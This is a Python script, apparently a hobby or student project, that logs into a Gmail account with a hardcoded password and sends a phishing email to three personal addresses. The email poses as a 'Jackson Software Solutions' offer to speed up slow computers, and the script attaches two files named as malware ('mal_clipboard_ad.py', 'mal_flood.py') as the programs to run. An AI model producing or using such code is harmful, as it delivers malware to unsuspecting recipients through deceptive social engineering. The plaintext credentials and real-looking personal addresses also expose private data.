from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase 
from email import encoders 
import smtplib

emails = ['gncis8@gmail.com','gncis@yahoo.com','samreenansari1998@gmail.com']
files = ['mal_clipboard_ad.py','mal_flood.py']

def send_email(emails,files):
	server = smtplib.SMTP('smtp.gmail.com', 587) #to connect with the smtp gmail server
	server.ehlo()
	server.starttls() #STARTTLS is a way to take an existing insecure connection and upgrade it to a secure connection using SSL/TLS.

	server.login("jacksonsoftwaresolutions@gmail.com", "Bt(c@245")

	msg = MIMEMultipart()
	msg['Subject'] = 'Protect your Computer now with Jackson'
	msg['From'] = "jacksonsoftwaresolutions@gmail.com"
	msg['To'] = ','.join(emails)

	html_txt = """
	<html>
		<body>
			<img src="https://www.avineon.com/sites/default/files/Software-Solutions_1285x588.jpg" alt="Company logo">
			<h2> Jackson Software Solutions can Help you </h2>
			<h3> Has your compueter been getting slow and troublesome?</h3>
			<h4> We have the solution to everythin with a few programs that can 
			optimize the RAM to work properly with the processor and make the system super fast</h4>
		
			<p> All you need to do is run these programs to maximize the power of your system to make it faster than
			ever before. We at Jackson software solutions want you to have be safest and most pleasant experience while
			using your computer.
			</p>

			<h4>Yours Faithfully /n
			Xavier Jackson</h4>
			
		</body>
	</html>
	"""

	part = MIMEText(html_txt, 'html')

	msg.attach(part)


	for item in files:
		attachment = open(item, "rb") 
		
		# instance of MIMEBase and named as p 
		p = MIMEBase('application', 'octet-stream') 
		  
		# To change the payload into encoded form 
		p.set_payload((attachment).read()) 
		  
		# encode into base64 
		encoders.encode_base64(p) 
		   
		p.add_header('Content-Disposition', "attachment; filename= %s" % item) 
		  
		# attach the instance 'p' to instance 'msg' 
		msg.attach(p) 

	text = msg.as_string() 
  
	# sending the mail 
	server.sendmail(["jacksonsoftwaresolutions@gmail.com"], emails, text) 
	  
	# terminating the session 
	server.quit() 

send_email(emails,files)